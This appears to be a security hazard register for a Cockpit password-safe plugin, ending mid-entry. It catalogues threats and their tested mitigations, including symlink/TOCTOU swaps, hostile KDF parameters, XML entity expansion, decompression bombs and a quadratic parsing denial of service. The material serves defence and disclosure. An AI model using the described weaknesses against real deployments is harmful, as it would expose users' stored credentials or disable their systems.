# Known issues register — cockpit-secrets

Every hazard identified for a Cockpit plugin that unlocks and fully manages KeePass (KDBX)
and Password Safe v3 safes, with severity, root cause, the mitigation that closes it, and the
task that owns it. Tasks cite these ids; a task is not done until its cited ids are either
MITIGATED or explicitly re-classified with a reason.

**61 entries as of 0.5.1.** I56–I60 are the five the 0.5.0 restyle's own verification
declared still wrong, closed in 0.5.1; each names the check that goes red when its fix is
reverted, and each was watched failing. I43–I54 are the twelve the red-team round against the
registry-write feature found, and I55 is a thirteenth found by 0.4.0's own cleanup —
the first thing in the project's history to delete a safe and then reuse its id. Every one is
FIXED, every one has a regression check in
`tests/integration/registry_writes.py` that was watched going red with its fix reverted, and
every one has a standing ban in `validate.sh` that was watched firing on a deliberate
violation. Four items remain genuinely open and are tracked rather than closed (I36, I37, I38, I61);
one is argued and left standing with a runtime warning (I35).

Legend — Sev: **C**ritical / **H**igh / **M**edium / **L**ow.
Status: OPEN / MITIGATED / BY-DESIGN / WONTFIX. **FIXED** appears on entries added after the
adversarial pass and means the same as MITIGATED — the hazard is closed and the evidence is in
the entry. The two words are not a severity or a confidence distinction; the register simply
grew a second author. Every closed entry names its regression test.

---

## Access control and identity

### I1 · A safe is a file, and files have no notion of "user safe" vs "admin safe" · Sev C · OPEN→(design closes)
Nothing in KDBX or PWS3 records who may open it. Access class is **our** concept and must be
imposed from outside the file, or it does not exist. **Mitigation:** a root-owned registry,
`/etc/cockpit-secrets/safes.d/*.json` (0644 root:root, directory 0755 root:root), is the only
source of safes. Each entry declares `access: "admin" | "user"`. **A registry entry with no
`access` key is `admin`** — the default is the restrictive one, and an unparseable entry is
dropped with a logged error rather than defaulted open. Owner: Task 2.

### I2 · Two access classes need two privilege levels, not one · Sev H · MITIGATED (proved as a pair, live)
Running everything as root makes every user safe a root-readable file and every bug a root
bug. **Mitigation:** one helper binary, two invocations. `access:"user"` safes are handled by
`cockpit.spawn([...])` with **no** superuser option — the helper runs as the logged-on user
under their own bridge, and can only reach files that user could already read. `access:"admin"`
safes require `cockpit.spawn([...], {superuser:"require"})`; the helper refuses the verb unless
`os.geteuid() == 0`. Least privilege per safe, not per plugin. Owner: Task 2.

**Status after the 2026-09-04 re-gate: proved as a PAIR under a real bridge.**
`docs/COMPATIBILITY.md` §8 used to carry a row reading *"`superuser: "require"` under a real
Cockpit bridge — no test has ever run against a real bridge."* That is out of date and has been
corrected. `tests/browser/live-access.spec.js` item 9 runs against live Cockpit 360 signed in as
a real account, and both directions hold: with administrative access OFF, an admin-class safe is
refused immediately by the bridge and **no prompt is drawn anywhere**; after Cockpit's OWN header
control grants it, the same safe opens through the page and renders 6 rows out of a root-owned
file the account cannot read unescalated. 22/22 checks, run twice from a reset state. The
refusal alone would prove nothing; the pair is the evidence.

### I3 · A browser-side access check is cosmetic · Sev C · MITIGATED (driven from devtools, live)
Verified in a sibling project: cockpit-guac-rdp `I4` shipped an `if (t.admin && !isAdmin)` in
JS and it was bypassable by driving the backend directly. **Mitigation:** the UI may *hide*
what a user cannot use, but every verb re-derives the caller's identity and re-checks the
class server-side. The test suite drives the helper directly as a non-admin and asserts
refusal. Owner: Task 2, Task 9.

**Status after the adversarial review and the 2026-09-04 re-gate: MITIGATED, three ways.**
(1) All 33 verbs were driven directly as `cptest` (uid 1005, not in `sudo`) against a real
admin-class safe, through `runuser -u cptest` from a root job so the kernel identity was
genuinely 1005 — every safe-operating verb answered `access-denied`, and the file was never
opened, so no header, KDF, iteration count or format fact leaked either. (2) The same refusal
holds for autosave mutations carrying the CORRECT passphrase, which proves `gate()` runs before
the KDF and not after. (3) `tests/browser/live-access.spec.js` item 8 reproduces it in the live
page **and from devtools**, driving the helper directly past the UI — 22/22 with item 9, twice.
The positive control that makes those refusals meaningful is in the same run: `cptest` opening a
user-class safe it genuinely owns succeeds.

### I4 · Client-supplied paths · Sev C · OPEN→(design closes)
If the browser can name the file to open, "user" access is meaningless — ask for
`/etc/cockpit-secrets/safes/root.kdbx` and see what happens. **Mitigation:** verbs take a
**registry id**, never a path. Path resolution happens only inside the helper, from the
registry. There is no verb that opens an arbitrary path. Owner: Task 2.

### I5 · Symlink and TOCTOU attacks on safe files · Sev H · OPEN→(design closes)
A `user` safe lives under a path the user controls, so they can swap it for a symlink to
`/etc/shadow` between the check and the open — and a root-mode helper would follow it.
**Mitigation:** open with `O_NOFOLLOW|O_CLOEXEC`, `fstat` the **fd** (never re-`stat` the
path), verify `st_uid` against the expected owner, reject anything not a regular file, reject
group/other-writable parents, and do every subsequent operation on that same fd. Owner: Task 2.

---

## Cryptography and file parsing

### I6 · Verify-before-use, and constant-time comparison · Sev C · OPEN→(design closes)
PWS3 puts its HMAC at the **end** of the file, so the format forces decrypt-then-authenticate;
KDBX4 authenticates per block but the inner XML is still attacker-shaped until the MAC checks
out. Returning any value before the MAC verifies turns a parser bug into a decryption oracle.
**Mitigation:** parse into memory, verify the MAC, and only then let a value escape the
backend adapter. All MAC and hash comparisons use `hmac.compare_digest`. A wrong password and
a corrupt file produce the **same** error taxonomy to the client, with the distinction only in
the audit log. Owner: Task 3, Task 4.

### I7 · KDF parameters are attacker-controlled · Sev H · OPEN→(design closes)
KDBX carries its Argon2 `m`/`t`/`p` in the header; PWS3 carries `ITER`. A hostile file can
demand 4 GiB of memory or 10^9 iterations and take the helper — and on the admin path, root —
with it. **Mitigation:** clamp before the KDF runs. Reject Argon2 `m` > 1 GiB, `t` > 32,
`p` > 8; reject PWS3 `ITER` outside [2048, 8388608] and **write** at the format's current
floor of 262144. Enforce an overall wall-clock and RSS budget on the derivation. Owner: Task 3, Task 4.

### I8 · XXE / entity expansion in the decrypted KDBX inner XML · Sev H · OPEN→(design closes)
KDBX4's payload is XML, parsed here by `lxml`. Entities and DTDs are a billion-laughs and
file-disclosure vector even though the XML is "ours" — it is only ours *after* it verifies.
**Mitigation:** construct the parser explicitly with `resolve_entities=False`,
`no_network=True`, `load_dtd=False`, `huge_tree=False`, and cap the decompressed inner size.
Assert it in a unit test with a hostile fixture — do not rely on a library default that can
change. Owner: Task 3.

### I9 · CSP weakening for in-browser crypto · Sev H · BY-DESIGN (avoided)
Doing Argon2 in the browser needs WASM, which needs `wasm-unsafe-eval` in the package
manifest CSP — a weaker policy on the one page that handles every password we own.
**Mitigation:** no browser-side crypto at all. The manifest adds **no** CSP relaxation; the
plugin must run clean under Cockpit's default `default-src 'self'`, which also means no inline
`<style>`/`<script>` and no `eval`. A test asserts the manifest contains no
`content-security-policy` key. Owner: Task 5.

### I10 · Secret material on argv / in the environment / in temp files · Sev C · OPEN→(design closes)
`/proc/<pid>/cmdline` and `/proc/<pid>/environ` are readable by the process owner and by root,
and argv reaches shell history and audit trails. **Mitigation:** the master password, key-file
contents and every decrypted value travel **only** on the helper's stdin/stdout as JSON frames.
No verb accepts a secret as an argument. No secret is ever written to a temp file. A test
reads `/proc/<pid>/cmdline` and `/proc/<pid>/environ` of a live helper mid-unlock and asserts
the passphrase is absent. Owner: Task 2, Task 8.

### I11 · Browser-side persistence of the master password · Sev C · OPEN→(design closes)
`localStorage` and `sessionStorage` are origin-wide and survive navigation; anything stored
there is readable by any XSS anywhere in Cockpit. **Mitigation:** the password lives in one
function-scoped JS variable, is sent, and is overwritten. No storage API, no `IndexedDB`, no
cookie, no `autocomplete` on the field, no hidden form. A Playwright test asserts both storage
areas are empty after an unlock. Owner: Task 5, Task 8.

---

## Data integrity

### I12 · In-place writes destroy safes · Sev C · OPEN→(design closes)
A crash, a full disk, or a killed helper part-way through a save leaves a truncated database
and no undo — the worst possible outcome for this program. **Mitigation:** write to
`<safe>.tmp-<pid>` in the same directory, `fsync` the file, `os.replace`, then `fsync` the
directory. Take a timestamped backup into a retention ring **before** the first mutation of a
session. A test kills the helper with `SIGKILL` between write and rename and asserts the
original is intact. Owner: Task 6.

### I13 · Lost updates against a desktop client · Sev H · OPEN→(design closes)
KeePass/KeePassXC use `<name>.kdbx.lock`; Password Safe uses `.plk`. Ignoring them means a
save silently discards whatever the desktop app wrote. **Mitigation:** honour and create the
lock file for the duration of a write; additionally record `(mtime_ns, size, sha256)` at
unlock and re-check immediately before writing — on mismatch, refuse and surface a
"changed on disk" conflict, never merge silently. Owner: Task 6.

### I14 · Plaintext in process memory, swap, and core dumps · Sev H · PARTIAL (inherent)
Python `str` is immutable and interned: a password read into a `str` **cannot** be wiped, and
`gcore` on the helper would yield the whole decrypted safe. **Mitigation (defence in depth,
not a fix):** read secrets into `bytearray` and zero them in `finally`; set `RLIMIT_CORE=0`
and `prctl(PR_SET_DUMPABLE, 0)` at start-up; best-effort `mlockall(MCL_CURRENT|MCL_FUTURE)`
and log when it fails rather than pretending it worked; keep the helper's lifetime to a single
operation so the window is milliseconds, not hours. **Residual risk stated in the docs:** a
root-equivalent attacker on this host can read helper memory. That is true of every password
manager on every machine and is not solved here. Owner: Task 2, Task 9.

### I15 · Secrets in logs, errors and tracebacks · Sev H · OPEN→(design closes)
An unhandled exception prints locals; `wg-admin`'s header already warns that this host's job
logs are group-readable. **Mitigation:** a single top-level exception barrier that emits
`{"error": "<class>: <safe message>"}` and never a traceback to stdout; an audit log that
records *verb, safe id, caller uid, outcome* and never a value; a redaction filter applied to
everything the helper writes; and `set -x` explicitly banned in any shell wrapper. Owner: Task 2.

### I16 · Unbounded unlock attempts · Sev M · MITIGATED (both halves proved)
An unlock endpoint that never says no is an offline-strength guessing oracle with the KDF's
cost as the only brake. **Mitigation:** per-(uid, safe id) failure counter in a root-owned
state file with exponential backoff and a lockout threshold, plus a constant floor on the
failure path so a wrong password does not answer faster than a right one. Owner: Task 2.

**WHICH uid, stated once so it is not ambiguous anywhere else.** It is `Identity.real_uid` —
the human behind the escalation, `getuid()` on the user path and `SUDO_UID`/`PKEXEC_UID` at
euid 0. Not the euid. I40 is what happens when it is the euid, and this sentence is the one
I40's fix note asked for.

**Status after the adversarial review, the 2026-09-04 re-gate, and the I39/I40 fix.** The two
halves of this hazard came out differently and the entry says so rather than averaging them.
Both are now closed; the paragraph below records what each was measured at.

* **The constant floor holds, and is measured.** 200 samples each way against one safe with the
  real 0.75 s floor: wrong `min 1.0249 / med 1.0525 / max 1.0946`, correct
  `min 0.7681 / med 0.8265 / max 0.8743`. Fully separated in the direction this hazard requires
  — `correct.max < wrong.min` — and two *different* wrong passphrases are indistinguishable, so
  there is no per-guess signal. The floor is on every credential-bearing verb, not only
  `unlock`, because they all route through `need_backend → do_unlock`. It also cannot be
  starved: it is `time.monotonic()` plus one `sleep`, so load only lengthens it.
* **The counter now holds under concurrency, and across principals.** It did not: it was a
  lost-update race (**I39**) and, on the admin path, keyed on euid so every administrator
  shared one counter per safe (**I40**). Both were reproduced on 2026-09-04 and both are now
  fixed and closed — see those entries for the reproduction, the fix and the regression tests.
  Concurrent guessing is now indistinguishable from sequential guessing: 50 helpers fired at
  once against a hermetic registry yield **1 evaluated, 49 locked-out, counter reading 1**,
  which is what 8 sequential guesses yield.

**THE COUNTER IS ON EVERY CREDENTIAL-CONSUMING VERB, and this is now measured rather than
asserted.** The red team asked and the question went unanswered through two passes.
`tests/integration/lockout.py` section E reads the list of credential-bearing verbs out of the
`schema` verb — so a verb added later that accepts a passphrase is covered the day it is
written — and drives all 20 of them with the window open. 19 answer `locked-out`; the 20th,
`export`, is admin-class and is covered at a real euid 0 by `tests/root/driver_lockout.py`
section 6. The verbs that consume no credential (`probe`, `backups`, `restore-backup`, `list`,
`health`, `audit-tail`) are **not** refused, which is correct: a lockout is a brake on
guessing and a header read is not a guess. The reach was already right before the fix; what
was missing was anybody having shown it.

### I17 · Clipboard leakage · Sev M · OPEN→(design closes)
A copied password stays in the clipboard indefinitely and any focused page can read it.
**Mitigation:** copy through `navigator.clipboard` on an explicit user gesture only, with a
visible countdown and automatic clear (default 15 s), and clear on page hide/unload. Document
honestly that the clipboard is a shared OS resource and clearing is best-effort. Owner: Task 5.

### I18 · An unlock agent is a permanently unlocked safe · Sev H · MITIGATED (two residuals named)
"Do not prompt every time" is exactly the property we are trying not to have. **Mitigation:**
the agent is **off by default** and must be enabled per-safe in the registry. When on: an
`AF_UNIX` socket in a 0700 per-user run dir, peer identity from `SO_PEERCRED`, a handle bound
to the uid that created it, a **hard** idle timeout (default 300 s) and absolute lifetime
(default 3600 s), automatic lock on screen-lock/logout, and a visible "unlocked, N s left"
banner. Prompting stays the default for every safe that does not opt out. Owner: Task 7.

**Status after the second build.** The agent ships, and `tests/integration/agent_cycle.py`
drives the real helper against the real daemon: agent off is proved to create no socket and
leave no state; agent on is proved to take a ticket, be visible to a SECOND helper process, be
revoked by `lock` with a bare safe id, and expire on its own deadline.

The mitigation went further than the design asked in one way and stops short in two others,
and all three are deliberate:

* **The agent holds a TICKET, not key material.** `secrets-admin` sends no `material` and the
  daemon's `put` makes it optional. So the agent cannot hand a later helper an unlocked safe,
  and the passphrase is still prompted on EVERY unlock — the agent buys visibility and
  revocation, not "do not ask me again". The material path exists and is tested because this
  hazard sanctions it as a per-safe opt-in, but nothing in the tree uses it and the helper
  strips a `material` key out of any reply at the door. docs/CONTRACT.md, "What the agent
  holds", is the authority.
* **RESIDUAL — the lock detection is a 10 s poll**, not a subscription to logind's `Lock`
  signal, so there is up to one poll interval between the screen locking and the ticket being
  dropped. Suspend is handled two other ways that are not polls: the deadlines run on
  `CLOCK_BOOTTIME` so they count suspended time, and a tick gap larger than tick+30 s drops
  everything.
* **RESIDUAL — the admin class separates operators by INSTANCE, not by peercred.** For an
  `access:"admin"` safe the helper is root, so `SO_PEERCRED` reports uid 0 for every operator.
  The separation is one agent per operator behind a 0700 run dir (`secrets-agent@<uid>`), which
  `install.sh` installs and deliberately does not enable. The correct fix is for the root
  helper to fork and setuid to the operator before connecting; that is not implemented.

### I19 · "Compliant" is a claim, not a test result · Sev H · OPEN→(design closes)
A reader and a writer that share a bug round-trip perfectly and interoperate with nothing.
**Mitigation:** compliance is measured **only** against foreign implementations — files we
write must open in `keepassxc-cli`, files it writes must open in ours, plus the published
Twofish/format test vectors and a committed real-`pwsafe`-GUI fixture for PWS3. Where an
oracle is unavailable (no packaged PWS3 CLI on this host), the docs say so instead of
implying coverage we do not have. Owner: Task 8, Task 9.

### I20 · KDBX3 has no authenticated encryption · Sev M · OPEN→(design closes)
KDBX 3.1 predates the KDBX4 HMAC block scheme: a tampered file decrypts to attacker-influenced
XML with nothing to detect it. **Mitigation:** open KDBX3 read-only, show a persistent banner
naming the risk, and offer an explicit operator-confirmed "upgrade to KDBX4" that writes a new
file rather than converting in place. Never upgrade silently. Owner: Task 3, Task 6.

### I21 · Attachment and export paths are an exfiltration channel · Sev M · OPEN→(design closes)
"Export database as CSV/XML" writes every secret in plaintext to disk, and an attachment
export names a destination path. **Mitigation:** exports are an `admin`-only verb, off unless
enabled in the registry, always written `0600` to an operator-configured directory (never a
client-supplied path), always audited by name, and always preceded by an explicit confirm
naming what is about to be written in the clear. Attachment downloads stream through the
Cockpit channel to the browser rather than landing on the server's disk. Owner: Task 6, Task 7.

**Status after the second build: MITIGATED, and proved as a pair.** `export` is refused for a
user-class safe even when the caller owns the file, refused when `export_allowed` is false,
refused without the per-safe confirm token `export-plaintext:<id>`, refused for a confirm
naming a DIFFERENT safe, and refused for an unknown `fmt` — and the SAME request then succeeds
inside `unshare --map-root-user`, where `os.geteuid()` really is 0. A refusal on its own proves
nothing; the pair is the evidence. Measured in `tests/integration/newverbs.py`: the file lands
0600 in a 0700 directory under `export_dir`, named `<safe id>-<UTC stamp>.<ext>` minted
helper-side, the content is absent from the response, and the audit line carries the file name
and the row count and no value. `validate.sh` additionally pins the one call site that creates
an export to `export_dir_for(entry)`, so a destination from the request cannot reappear as a
one-line change.

The sibling hazard — a page that phones out about the passwords it holds — is closed the same
way: `breach-check` reads an operator-supplied local corpus and there is no online fallback.
`validate.sh` bans every network-capable name from the helper, the backends and the agent, and
the verb is measured answering correctly inside a network namespace whose only interface is a
DOWN loopback, with a control proving that namespace really is deaf.

### I22 · Silent format/feature loss on save · Sev M · OPEN→(design closes)
Reading a KDBX4.1 database with a library that does not model every field and writing it back
**deletes** what it did not understand — custom icons, previous-parent-group, quality flags,
plugin data. **Mitigation:** before the first write to a safe, diff a parse→serialize→parse
round trip and refuse to save if any field would be dropped, naming the field. Prefer refusing
to save over quietly amputating a database. Owner: Task 3, Task 6.

---

## Found by adversarial review, after v0.2.0 shipped every gate green

Everything above was found by the people who built this. The twelve entries below were not:
they came from six adversarial lenses attacking a build whose own tests were 16/16, whose
`validate.sh` was 15/15, whose live browser walkthrough was 140/140 and whose root-side
verification was 233/233 — and from an independent skeptic who then tried to kill each finding
and could not. **A reader and a writer that share a bug agree perfectly** is I19's sentence
about file formats; these are what it looks like applied to a test suite.

Each entry names the guard that now fails if the defect returns. Those guards live in
`tests/test_regressions.py` (run by `validate.sh` on every gate),
`tests/integration/adversarial.py` (run by `run_tests.sh`), and five new standing bans in
`validate.sh`. Every one of them was watched to fail with its fix reverted.

### I23 · A compression RATIO cannot tell a bomb from a log file · Sev H · MITIGATED
`_bounded_decompress` refused any inner payload expanding more than
`Limits.MAX_DECOMPRESS_RATIO` (200:1) above a 1 MiB floor. DEFLATE's physical maximum is
1032:1 — measured 1028:1 on this host for every size from 1 MiB to 256 MiB — so the threshold
did not separate a bomb from ordinary compressible content; it only decided how compressible a
legitimate attachment was allowed to be.

It decided wrong, in both directions. **Write side:** `attach_add` of an ordinary 8 MiB log
file (well inside `Limits.MAX_ATTACHMENT_BYTES`) produced a 33 KB database, `save()` answered
`{"ok": true}`, and every later `unlock` answered `invalid: compressed payload expansion ratio
258:1 is over the 200:1 limit` — while KeePassXC read the same file perfectly. Reachable with
no adversary at all (A7), and through the helper's own transport: the ratio is computed over
the whole inner payload, so it accumulates across frames, and four `attach-add` frames each
under the ~760 KiB transport ceiling did it. **Read side:** valid KDBX 3.1 databases written by
`keepassxc-cli`, whose attachments are gzipped individually in the binary pool, were refused at
`fields`, `attach_list`, `attach_get` and `export_plain` — and `_attachment_bytes(strict=False)`,
documented as the tolerant listing path, caught only four builtin exception types, so the
`Invalid` flew straight out and took the entry's every other field with it.

**Mitigation, in three parts, because the ratio was standing in for controls that were
missing.** (1) The bomb defence is the ABSOLUTE cap, enforced incrementally by
`decompressobj().decompress(data, max_length)` — memory never exceeds `MAX_INNER_BYTES`
whatever the ratio, so "expands until the allocator gives up" is impossible by construction
rather than by threshold. (2) New STRUCTURAL caps in `_reject_hostile_xml`, applied in the same
walk that already rejects DTDs and entity references: a `<String><Value>` over
`MAX_FIELD_BYTES`, a pooled `<Binary>` over `MAX_ATTACHMENT_BYTES` (measured as base64, so a
legal attachment is not refused a third under the limit), more than `MAX_ENTRIES` entries or
`MAX_GROUPS` groups. These describe what the content IS, which a ratio never could — they
refuse the corpus's 64 MiB single-value bomb and admit a 32 MiB attachment, and those two are
byte-identical to a ratio test. The write path already enforced `MAX_FIELD_BYTES` in
`_check_text`, so the read and write limits are now the same number and **this program cannot
write a file its own reader refuses**. (3) `Limits.parse_budget()` bounds the wall clock of
everything downstream — see I25. The ratio check is kept, raised above `_DEFLATE_MAX_RATIO`,
and its comment now says plainly that it is a corruption check and not a security control.
`_attachment_bytes(strict=False)` tolerates `SecretsError` as well as the four builtins.

Guards: `test_crypto01_ordinary_compressible_payload_is_not_a_bomb`,
`test_crypto01_attach_then_save_then_reopen`,
`test_crypto01_tolerant_attachment_path_tolerates_invalid`,
`test_input1_oversize_field_value_is_refused_structurally`,
`test_input1_attachment_text_gets_the_attachment_limit`. The corpus cases
`kdbx41-compression-bomb-ratio` and `-size` are still refused as `invalid`, in 0.35 s and
0.92 s against a 15 s budget.

### I24 · A save that writes a database the reader cannot open · Sev H · MITIGATED
The other half of I23, and the one that generalises. `save()`'s only pre-write check was
`_verify_own_output`, which re-ran the header hash and the per-block HMACs — neither of which
decompresses or parses, so every refusal living downstream of them was invisible to it. The
round-trip guard that would have caught it, `_assert_lossless` (I22), latches
`self._lossless = True` on its first run inside `_mutable()` and short-circuits on every later
call, so a mutation made AFTER that first check was never round-tripped.

**Mitigation:** `_verify_own_output` now re-opens the bytes it is about to write through the
SAME reader path a later `unlock` uses — `_bounded_decompress`, the hardened XML parser, the
structural caps, the protected-value pass — and runs `_diff_xml` against the tree being
serialised, on EVERY save. A refusal is a `Conflict` that names what the reader objected to,
and the live file is untouched. The cost is one symmetric decrypt and one parse per save, with
no KDF; a save is not a hot path and the alternative is a safe that is gone.

**CORRECTION, 2026-09-04.** The paragraph above originally ended with the sentence *"This also
closes the latent half of the same latch on the PWS3 side, where `_ensure_lossless` runs the I22
check once per session rather than once per save."* **That sentence was false and has been
removed.** `_verify_own_output` exists only in `backends/kdbx.py`; `backends/psafe3.py`'s
`save()` calls `_ensure_lossless()` and nothing else, and `_lossless_checked` still latches. The
PWS3 half was reproduced during the re-gate and is now **I41**, OPEN. This entry stands as
MITIGATED **for KDBX only**, which is what its guard actually tests.

Guard: `test_crypto01_save_refuses_output_it_cannot_read_back`, which makes the reader stricter
than the writer for the duration of one save and asserts both the refusal and that the live
file is byte-for-byte unchanged.

**UPDATE, 2026-09-04 (second pass).** The last sentence of the correction above — *"there is no
PWS3 equivalent, which is why the false claim survived review"* — is now out of date, and this
entry is MITIGATED for **both** formats. I41 is closed: PWS3 has the same per-save reader check,
the shared policy for it lives in `backends/base.py` where a third backend cannot omit it, and
the missing twin of this guard exists (`python3 -m backends.psafe3`, section *the pre-write
reader check*, which makes the reader stricter than the writer for one save and asserts the
refusal and the untouched file, exactly as this KDBX test does). See I41 for the evidence.

### I25 · No wall-clock bound on turning a payload into a database · Sev M · MITIGATED
`Limits.MAX_ENTRIES` says it "stops a file that claims 10^9 records and makes the helper build
the list before anything notices", but it was checked in `unlock()` AFTER
`PyKeePass(io.BytesIO(data), ...)` had parsed the payload and run its protected-value pass —
the expensive part, and the part whose size an attacker chooses. pykeepass evaluates
`tree.getpath(elem)` (O(position)) once per `Protected="True"` value that fails to decode, so
N such values cost O(N squared). Measured: a 3.8 MB KDBX4 file carrying exactly `MAX_ENTRIES`
such entries spent 46 s at 100% CPU and 313 MB of RSS inside the constructor **and was then
accepted**. Nothing wrapped that stretch: `kdf_budget` and `RLIMIT_AS` cover only `_derive`, and
`harden_process` sets no `RLIMIT_CPU`. On an `access:"admin"` safe the burnt core and the burnt
memory are root's. In scope for A3, and the committed corpus already asserts a 15 s budget for
MAC-valid hostile inner XML — the entry/protected-value COUNT dimension was the one it missed.

**Mitigation, two parts.** The count clamps moved INTO the parse (I23 part 2), so `MAX_ENTRIES`
now means what its docstring claims. And `Limits.parse_budget()` wraps the constructor: unlike
`kdf_budget`, which can only detect a C call's overrun after the fact, this one arms
`setitimer(ITIMER_REAL)` and raises out of the Python-level loop where the quadratic lives. Its
exception derives from `BaseException`, not `Exception`, because it fires deep inside pykeepass
and construct and both have broad `except Exception` handlers that would otherwise swallow it
and carry on with a half-built tree. It degrades to after-the-fact detection when signals are
unavailable (not the main thread), and the result is discarded either way. The same file now
answers `invalid: opening this database exceeded its 20.0s budget` at 20 s.

Guards: `test_input1_entry_count_is_refused_before_the_decode`,
`test_input1_group_count_is_refused_in_the_parse`,
`test_input1_parse_budget_stops_a_python_loop` (bounded, so a lost preemption fails rather than
hangs).

### I26 · A short write makes a truncated backup generation · Sev H · MITIGATED
`write(2)` may write fewer bytes than it was given. `_ring_backup`'s copy loop was
`os.write(bfd, chunk); off += len(chunk)` — it advanced by the bytes READ. Every other
data-carrying write in the program looped on the return value correctly, which is exactly why
nothing caught the one that did not. Measured on a 256 KiB tmpfs: a 4661-byte safe produced a
4096-byte "generation" that was `fsync`'d, named, listed by the `backups` verb with a plausible
size and timestamp, and accepted by `restore-backup` — which wrote it over the live safe, after
which the safe did not open. Worse, some of those saves returned `"saved": true`, so the
operator was never told. The backup ring is the only undo this program has (I12 names "a full
disk" as the exact hazard it exists to mitigate), and on the ENOSPC path the poisoned
generations also counted toward `keep`, pruning real history out from under themselves.

**Mitigation:** `backends/base.py write_all()` is now the only place in the program that calls
`os.write()`, and `validate.sh` COUNTS rather than describes — `tests/ban_os_write.py` parses
each file and requires exactly one `os.write` call node, inside `write_all`. `base.py` is
deliberately NOT exempt: a first version of that ban exempted it and passed with the bug put
back. A generation is additionally re-`fstat`ed after `fsync` and unlinked if it is short, so a
ring member is either complete or absent, the temp file in `atomic_replace` gets the same
assertion, and an `OSError` on the ring is reported as `the backup generation could not be
written: ENOSPC` rather than `internal / OSError`.

Guards: `test_durability1_write_all_loops_on_a_short_write`,
`test_durability1_a_short_backup_write_is_refused_and_removed`, and the DURABILITY-1 section of
`tests/integration/adversarial.py`, which injects one short write on the `.bak` fd through a
`sitecustomize` on `PYTHONPATH` and asserts the generation is the whole file.

### I27 · `restore-backup` installed a generation it had not checked · Sev L · MITIGATED
`_read_backup` bounded a generation from below only by "not empty", then checked four bytes of
format magic — and the comment above `_SAFE_MAGIC` claimed that "does prove it is not a
truncated file". A prefix of a real database keeps its magic, so a truncated generation (I26,
an interrupted `cp`, any partial write) passed and was written over the live safe. Full
verification is impossible by design here, because the verb deliberately takes no passphrase.

**Mitigation:** `Backend.verify_structure(data)` — a key-free, O(file) walk of the format's own
framing. KDBX4 is fully checkable: header hashes present, then the
`hmac(32) | length(u32) | bytes` block chain walked to its zero-length terminator, ending
exactly at end-of-file. KDBX 3.x has no block framing, so the strongest honest statement is
"the ciphertext is present and a whole number of cipher blocks", and the docstring says so
rather than implying more. PWS3's `_split_prefix` already was this check. The ABC's default
REFUSES rather than returning True, so a format that has not implemented it cannot read as
verified — and `_read_backup` looks the backend up through `load_backend_class`, not
`backend_for`, because the lazily-imported module would otherwise raise `Unsupported` and be
read as "no check exists". (That was found by the regression test, not by review.)

Guards: `test_durability4_*` (five), and the DURABILITY-4 section of `adversarial.py`.

### I28 · An orphan lock file wedged a safe permanently · Sev L · MITIGATED
`LockFile.acquire()` creates the lock `O_CREAT|O_EXCL` and then writes the payload. When that
write failed — a completely full filesystem is the case that happens — the exception left
`acquire()` from inside `__enter__`, so Python never called `__exit__` and nothing ever removed
the file. Measured: every later save answered `conflict / the safe is locked by an unnamed
process`, long after the disk was free, with `override_stale` as the only way out. That trains
the operator to force past lock files, and forcing past a REAL KeePassXC lock is precisely the
lost update I13 exists to prevent.

A sibling defect at the same call site: a DIRECTORY at the lock path made the safe un-savable
with **no** override at all. `_read_holder` called `os.read` on a descriptor `os.open` had
happily given it for a directory; the `IsADirectoryError` was raised INSIDE the
`except FileExistsError` handler, where the sibling `except OSError` of the same statement
cannot catch it, so it escaped as `internal / IsADirectoryError` before the `override_stale`
branch was ever consulted.

**Mitigation:** `acquire()` unlinks the lock it just created if the payload write fails, and
reports the errno class. `_read_holder` and `_holds_our_token` guard their reads separately from
their opens. A lock path that is not a regular file or a symlink is named as debris in a
`Conflict` — "remove it by hand, this is not something an override can clear" — which is true
and actionable, rather than sending the operator to close a client that is not running.

Guards: `test_durability2_a_failed_payload_write_leaves_no_lock`,
`test_durability5_a_directory_at_the_lock_path_is_a_conflict`, and
`test_durability5_an_ordinary_stale_lock_still_overrides` as the control.

### I29 · Duplicate field names resolved first-wins · Sev L · MITIGATED
`_field_element()` returned the first `<String>` whose `<Key>` matched, and `Pws3Db.field_get`
the first field of a given type. KeePassXC 2.7.10 REFUSES a KDBX with a repeated string key
outright ("Duplicate custom attribute found"), so a safe supplied by A3 displayed a password no
reference implementation would ever show. The write path was sharper: `edit` rewrote the first
copy and answered `{"changed": ["password"]}` while the second — the one another reader might
use — kept the old value. A credential rotation that silently did nothing.

The KDBX **header** parser already refuses a repeated field for exactly this reason ("a parser
differential waiting to happen … Refuse rather than pick", `backends/kdbx.py`). The rule simply
had not been applied one layer down.

**Mitigation:** it is now applied at the layer every read and write passes through.
`_field_element` refuses a repeat; `_assert_unique_fields` runs from `_entry()`, which every
uuid-addressed verb goes through, so the six core fields — which `edit` sets through pykeepass's
own property setters, deliberately, so that OTP and tag semantics stay pykeepass's — are covered
too. For PWS3, `Pws3Db._one()` is the single index lookup behind `field_get` / `field_set` /
`field_del`, so a read and a write cannot disagree about which copy is "the" field, and `unlock`
scans every record so the operator learns at open time. Only field types the format defines are
scanned: an unknown repeated type is data we preserve unchanged (I22), not a rule to invent.
0x11 repeats legitimately and is a HEADER field, reached through `header_get`, so it is
untouched.

One half of the original finding is NOT confirmed and is not claimed: that pwsafe's
`CItem::SetField` keeps the LAST occurrence. There is no pwsafe source or GUI on this host to
check it against (I19's standing gap for PWS3). The verified reference disagreement is the KDBX
one.

Guards: `test_crypto04_kdbx_*` (two), `test_crypto04_pws3_*` (two).

### I30 · `redact()` did not see what `json.dumps` had escaped · Sev L · MITIGATED
The blanket filter over `emit()` and `audit()` matches literal text, and both call it on the
OUTPUT of `json.dumps`. `_redaction_candidates` generated the raw value, its latin-1 reading,
`repr()` of each, base64 and hex — but not the JSON rendering, and those are different strings:
`repr()` switches to single quotes rather than escaping a double quote, and renders NUL as a
`\xNN` escape where JSON writes a `\uNNNN` one. So a passphrase containing `"` or NUL passed the
net untouched. The project's own self-check uses an alphanumeric sentinel, which is why 15/15
passed. The backslash case worked only by accident, because `repr` doubles it the same way JSON
does.

No live escape exists today and none is claimed: `scrub_listing` strips value-shaped keys from
every non-value-bearing verb, and `SecretsError` redacts its detail as a plain string BEFORE
`json.dumps`, where the filter works. This is a hole in the last line of defence, reachable only
through a coding mistake that has not been made — which is the whole point of a last line of
defence.

**Mitigation:** both JSON renderings (`ensure_ascii` False and True) are now candidates. The
`ensure_ascii=True` form also closes the `\uNNNN` case for every `json.dumps` in the program
other than `emit()`, which passes False for exactly that reason.

Guard: `test_leakage01_*`, over quote, NUL, backslash, plain and non-ASCII passphrases at both
